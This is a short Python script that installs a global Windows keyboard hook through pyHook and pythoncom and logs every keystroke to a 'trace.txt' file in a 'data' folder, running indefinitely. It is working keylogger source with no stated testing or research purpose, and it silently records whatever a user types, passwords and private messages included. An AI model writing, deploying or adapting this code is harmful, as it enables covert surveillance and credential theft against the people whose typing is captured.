import os
import sys
import logging
import pyHook, pythoncom

file_log = r"trace.txt"
dir_log = r"data"

# get relative file path
def get_filename(fn, dir):
	log_directory = os.path.join(os.getcwd(), '..', dir)

	if not os.path.exists(log_directory):
		os.mkdir(log_directory)

	os.chdir(log_directory)
	log_directory = os.getcwd()

	return os.path.join(log_directory, fn)

def on_keyboard_event(event):
	logging.basicConfig(filename=get_filename(file_log, dir_log), level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

if __name__ == "__main__":
	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = on_keyboard_event
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()